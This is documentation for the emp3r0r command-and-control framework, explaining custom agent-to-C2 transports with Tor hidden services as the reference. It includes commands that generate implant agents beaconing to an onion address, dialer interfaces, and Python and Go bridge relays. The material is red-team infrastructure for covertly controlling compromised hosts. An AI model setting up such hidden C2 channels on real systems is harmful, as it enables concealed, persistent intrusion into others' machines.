# Custom C2 transports

A custom transport carries agent↔C2 traffic over any reliable byte stream:
Tor, DNS, SMB, a cloud drive, a chat service, or a protocol you control. The C2
protocol, authentication, jobs, modules, and file transfers stay unchanged.
Only the pipe between the agent and the C2 changes.

A custom transport has two parts:

| Part         | Runs on           | Purpose                                              |
| ------------ | ----------------- | ---------------------------------------------------- |
| Agent dialer | The agent         | Opens the custom wire and returns a byte stream      |
| Bridge       | The operator host | Accepts that wire and forwards each stream to the C2 |

The agent side is compiled into the agent. The bridge is a separate process and
can be written in any language. It connects to the running C2 over a local Unix
socket, so adding or changing a transport does not require rebuilding or
restarting the C2.

The built-in `http_poll`, `h2conn`, and `quic` transports work as before and do
not need a bridge.

## Before you start

- The C2 is installed and running.
- You can write a small agent transport in Go, or use the supplied Tor dialer.
- For Tor, the agent host can reach a SOCKS5 proxy provided by Tor, and the C2
  host can publish a Tor hidden service.

## Tor quick start

Tor is the reference custom transport. It is not included in the default agent; compile it
with `with_transport_tor`.

### 1. Start the C2

The C2 always listens on a local bridge socket. The default is
`<workspace>/bridge.sock`, usually `~/.emp3r0r/bridge.sock`.

To use another path, set `bridge_socket` in `emp3r0r.json`:

```json
{
  "bridge_socket": "/run/user/1000/c2-bridge.sock"
}
```

### 2. Start the Tor bridge

The bridge listens on a local TCP port. Tor forwards the hidden service to that
port, and the bridge forwards each connection to the C2 socket:

```bash
cd core
go run ./transports/tor/bridge --listen 127.0.0.1:8080 --c2-socket "$HOME/.emp3r0r/bridge.sock"
```

The bridge and the C2 must run as the same user.

### 3. Publish the hidden service

Point Tor at the bridge port:

```text
HiddenServiceDir /var/lib/tor/c2/
HiddenServicePort 80 127.0.0.1:8080
```

Reload Tor and read the generated hostname from
`/var/lib/tor/c2/hostname`.

### 4. Build an agent with the Tor dialer

With the builder:

```bash
python3 core/build.py --build --agent-tags 'with_transport_tor'
```

Or with the installer:

```bash
./install.py --agent-tags 'with_transport_tor'
```

Only the agent needs this tag. The C2 binary does not.

### 5. Generate the agent

Select `tor` as the channel mode and pass the agent's SOCKS5 proxy:

```text
generate --type linux_executable --arch amd64 --cc abcdefghijklmnop.onion:80 --c2-channel-mode tor --allow-custom-transport --transport-option socks5=127.0.0.1:9050
```

`--allow-custom-transport` is required because `tor` is not built into the C2.
The transport name must match the agent dialer and the bridge.

For a custom channel, the C2 treats `--cc` as an opaque address. It does not add
an HTTP scheme, change TLS certificates, or run the HTTP preflight check.

### 6. Verify

The agent should appear in the C2 after it dials the onion service. If it does
not:

- confirm the hidden service is reachable and forwards to the bridge port;
- confirm the bridge is running as the C2 user;
- confirm the agent has a live SOCKS5 proxy at `socks5`;
- confirm the agent was built with `with_transport_tor`;
- confirm the transport name is `tor` in the agent config and the bridge.

## Write your own transport

### Agent dialer

The public interface is `core/pkg/agenttransport`:

```go
type Target struct {
    Address string
    Proxy   string
    Options map[string]string
}

type Dialer interface {
    Name() string
    Dial(ctx context.Context, target Target) (io.ReadWriteCloser, error)
}

func Register(d Dialer)
```

`Address` comes from the agent's `cc_address` and is not modified for custom
transports. `Proxy` is the generic `c2_transport_proxy` value. `Options` comes
from `transport_options`.

A minimal dialer:

```go
package mytransport

import (
    "context"
    "io"

    "github.com/jm33-m0/emp3r0r/core/pkg/agenttransport"
)

const Name = "mytransport"

type dialer struct{}

func (dialer) Name() string { return Name }

func (dialer) Dial(ctx context.Context, target agenttransport.Target) (io.ReadWriteCloser, error) {
    return openMyWire(ctx, target.Address, target.Options)
}

func init() {
    agenttransport.Register(dialer{})
}
```

Compile the dialer into the agent with a build tag and a blank import in
`core/cmd/agent/`:

```go
//go:build with_mytransport

package main

import _ "example.com/my-c2/transports/mytransport"
```

Then build with the tag:

```bash
python3 core/build.py --build --agent-tags 'with_mytransport'
```

The dialer must:

- return a reliable, ordered, full-duplex byte stream;
- propagate EOF and close;
- respect context cancellation;
- pass bytes through without parsing, decrypting, or changing them.

`http_poll`, `h2conn`, and `quic` implement the same interface. HTTP-specific
settings stay inside the HTTP dialers and are not part of the custom interface.

### C2 bridge

For each logical agent stream, the bridge must:

1. connect to the C2 bridge socket;
2. write a preface;
3. pump raw bytes in both directions until either side closes.

The preface is:

```text
u32_be(header_length) || UTF-8 JSON header || raw byte stream
```

The JSON header is bounded at 4096 bytes:

```json
{
  "version": 1,
  "transport": "mytransport",
  "remote": "203.0.113.9:53000",
  "stream": "optional-opaque-id",
  "options": {}
}
```

| Field       | Required | Meaning                                          |
| ----------- | -------- | ------------------------------------------------ |
| `version`   | yes      | Preface version; currently `1`                   |
| `transport` | yes      | Lower-case transport name shared with the dialer |
| `remote`    | no       | Agent address for logs; omit if unknown          |
| `stream`    | no       | Opaque bridge-side stream identifier             |
| `options`   | no       | Reserved for bridge/C2 diagnostics               |

After the preface, the connection is a raw byte pipe. Do not add another
framing layer.

Minimal Python bridge:

```python
import json, socket, struct, threading

def pump(src, dst):
    try:
        while True:
            data = src.recv(65536)
            if not data:
                break
            dst.sendall(data)
        dst.shutdown(socket.SHUT_WR)
    finally:
        src.close()
        dst.close()

def handle(agent, c2_socket, transport, remote):
    c2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    c2.connect(c2_socket)
    header = json.dumps({
        "version": 1,
        "transport": transport,
        "remote": remote,
    }).encode()
    c2.sendall(struct.pack(">I", len(header)) + header)
    threading.Thread(target=pump, args=(agent, c2), daemon=True).start()
    pump(c2, agent)
```

For message-oriented media, concatenate messages in order on reads and split on
writes; the C2 sees a byte stream.

### Go bridge library

`core/pkg/transportbridge` implements the bridge contract:

```go
import "github.com/jm33-m0/emp3r0r/core/pkg/transportbridge"

err := transportbridge.ServeTCP(ctx, "127.0.0.1:8080", transportbridge.Config{
    Transport: "mytransport",
    C2Socket:  "/home/me/.emp3r0r/bridge.sock",
})
```

`Serve` and `Relay` are also exported. The Tor bridge command is a complete
reference implementation.

### C agent

The C agent uses the same bridge and the same wire. A transport provider is one
build-time file, `core/c_agent/src/transport/transport_<name>.c`. The shipped
Tor provider is the reference.

Generate a Tor C agent with the normal C generator:

```text
generate_c --cc abcdefghijklmnop.onion:80 --c2-channel-mode tor --allow-custom-transport --transport tor --transport-option socks5=127.0.0.1:9050
```

For a manual build, select the provider and supply the generated config source:

```bash
make -C core/c_agent agent TRANSPORT=tor CONFIG_SRC=/path/to/config_embedded.c
```

To add your own provider:

1. Create `core/c_agent/src/transport/transport_<name>.c`.
2. Implement `c2_transport_create()`, `c2_transport_name()`, and the stream
   operations from `include/transport.h`.
3. Read the endpoint from `cfg->cc_address` and custom settings with
   `c2_agent_config_option(cfg, "key")`.
4. Build with `TRANSPORT=<name>`.
5. Generate with `--c2-channel-mode <name> --allow-custom-transport
--transport <name>`, adding `--transport-option key=value` as needed.

The provider returns the raw byte stream only. `SecureConn`, authentication,
routing, jobs, and files are handled above it, exactly as on the Go agent. The
C agent does not load transports at runtime; rebuild it when the wire changes.

## Configuration reference

### C2

| Setting         | Meaning                                                                                       |
| --------------- | --------------------------------------------------------------------------------------------- |
| `bridge_socket` | Unix socket for custom transport streams; defaults to `bridge.sock` in the operator workspace |

The bridge listener always starts with the C2.

### Agent

| Setting             | Meaning                                       |
| ------------------- | --------------------------------------------- |
| `c2_channel_mode`   | Transport name; selects the registered dialer |
| `cc_address`        | Opaque address passed to the dialer           |
| `transport_options` | Map of transport-specific strings             |

Generated with the console:

```text
generate ... --c2-channel-mode <name> --allow-custom-transport --transport-option key=value [--transport-option key=value ...]
```

`--allow-custom-transport` is required for any mode that is not `http_poll`,
`h2conn`, or `quic`.

### Built-in modes

These do not use a bridge:

- `http_poll`: HTTP polling, including HTTPS and the malleable profile;
- `h2conn`: HTTP/2 duplex;
- `quic`: QUIC with the per-build static key.

KCP is a P2P mesh transport only. It cannot be selected as a C2 channel.

## Multiple custom transports

The C2 bridge socket accepts any number of bridge processes. Each bridge names
its transport in the IPC preface, but the C2 does not route by that name: it
simply hands each stream to the normal dispatcher. Run one bridge per wire or
endpoint, and point each agent at the matching address.

Different agents can use different transports at the same time. Each agent
config carries one `c2_channel_mode`, so an agent picks exactly one wire:

```text
# Agent A: Tor
generate ... --cc abcdef.onion:80 --c2-channel-mode tor --allow-custom-transport --transport-option socks5=127.0.0.1:9050

# Agent B: another custom wire
generate ... --cc my-zone --c2-channel-mode mydns --allow-custom-transport --transport-option key=value
```

A Go agent may carry several dialers in one binary by combining build tags:

```bash
python3 core/build.py --build --agent-tags 'with_transport_tor with_transport_mydns'
```

The dialer is selected per generated agent with `--c2-channel-mode`.

A C agent links one `TRANSPORT` provider per binary. To run multiple custom
transports on C agents, build one C agent per wire and let each use its own
provider and channel mode. One C binary with several selectable providers is
not currently supported.

## Constraints

- The wire must be a reliable, ordered, full-duplex byte stream.
- Use one bridge IPC connection per logical stream.
- Run the bridge as the same user as the C2. On Linux the C2 checks the peer
  UID.
- Custom transports carry ciphertext only. The C2 still authenticates agents,
  enforces TOFU, re-keys sessions, and applies operator policy.
- A custom agent dialer is trusted code inside the agent.
- P2P mesh is not supported together with a custom C2 transport.
- The transport is selected when the agent is generated. Changing it requires
  generating a new agent.

## Troubleshooting

| Symptom                            | Check                                                                                        |
| ---------------------------------- | -------------------------------------------------------------------------------------------- |
| `unknown transport "x"`            | The agent was built without the matching dialer tag                                          |
| `invalid c2-channel-mode`          | Add `--allow-custom-transport`                                                               |
| `bridge path ... is not a socket`  | Remove the stale regular file or fix `bridge_socket`                                         |
| `bridge peer uid ...`              | Run the bridge as the same user as the C2                                                    |
| `invalid preface`                  | Header length, JSON, version, or transport name is invalid                                   |
| Agent connects but never checks in | Start the C2 before the bridge; verify the wire reaches the bridge; check the dialer options |
| HTTP preflight seems skipped       | Expected: custom modes do not run HTTP preflight                                             |
